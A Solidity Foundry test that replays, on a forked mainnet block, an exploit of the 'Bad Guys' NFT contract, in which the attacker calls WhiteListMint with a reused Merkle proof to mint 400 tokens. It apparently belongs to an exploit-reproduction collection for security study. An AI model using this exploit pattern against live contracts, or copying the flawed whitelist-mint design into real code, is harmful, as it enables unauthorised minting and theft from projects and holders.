// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

interface IBadGuys {
    function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) external;
    function flipPauseMinting() external;
    function balanceOf(address owner) external view returns (uint256 balance);
}

contract Exploit_Bad_Guys_NFT is TestHarness {
    
    IBadGuys internal constant nft = IBadGuys(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);
    address internal constant project_owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade;
    address internal constant attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;

    // TODO: we could improve this scenario by removing `prank(ATTACKER)` and redoing
    // the logic of constructing a merkle proof for an arbitrary address
    function setUp() external {
        cheat.createSelectFork("mainnet", 15460093); // One before the mint

        cheat.prank(project_owner);
        nft.flipPauseMinting();
    }

    function test_attack() external {
        bytes32[] memory merkleProof = new bytes32[](15);

        merkleProof[0]  = 0xa3299324d1c59598e0dfa68de8d8c03d7492d88f6068cdd633a74eb9212e19e5;
        merkleProof[1]  = 0x5dcd197f362a82daaf56545974db26aabfe335be4c7eef015d3d74ccea4bf511;
        merkleProof[2]  = 0x18d716ad7f5113fe53b24a30288c6989dd04e6ad881be58b482d8d58f71c42da;
        merkleProof[3]  = 0x97a98e092a76c15cef3709df2776cf974e2519231e79c9ad97c15a1835c5c4be;
        merkleProof[4]  = 0x171696d6231b4a201927b35fe2dae4b91cefb62bef849a143560ebbb49cee5df;
        merkleProof[5]  = 0xe89305151bbec931414ab9693bf886cf3b96dba00ca338b1c0aaae911b6dff35;
        merkleProof[6]  = 0x69691b91227fa34a7a9a691d355fd6c466370928ddf3d50a347e894970f10079;
        merkleProof[7]  = 0x78299a273b7d50bcb1d75df1694be463b9cc66c6520026b785615c4594dbb1ba;
        merkleProof[8]  = 0xb297db4d926f0ebc26e098afcefa63d1d86d2e047ecbc36357192ef5240ea0ea;
        merkleProof[9]  = 0xb875ced562ca82ce114152c899bbd085d230a17be452243fda43bf995774243e;
        merkleProof[10] = 0xd284a1831379548ff6bb0b5ad75ce8d0d1fea1cdc7b40b5f8d2e2307c9eda32c;
        merkleProof[11] = 0x7eff30a405cfce9989fe9d71e346d7b3616fa69b8251782898226268818f63fb;
        merkleProof[12] = 0x651ec4246f6e842692770a6ebd63396b4d62b52a3406522a02f182b8a16ba48c;
        merkleProof[13] = 0xee17656e8a839ac096dd5905744ada01278fc49b978260e9e3ddd92223cc18d7;
        merkleProof[14] = 0xce5c61c22a5d840c02b32aaebf73c9bc3c3d71c49f22b22c4f3cae4aa1fd557b;

        emit log_string("Attacker balance");
        emit log_named_decimal_uint("Before mint", nft.balanceOf(attacker),0);
        uint256 nftsBefore = nft.balanceOf(attacker);
        cheat.prank(attacker);
        nft.WhiteListMint(merkleProof, 400);
        uint256 nftsAfter = nft.balanceOf(attacker);
        emit log_named_decimal_uint("After mint", nft.balanceOf(attacker), 0);

        assertGe(nftsAfter, nftsBefore);
    }        
   

}
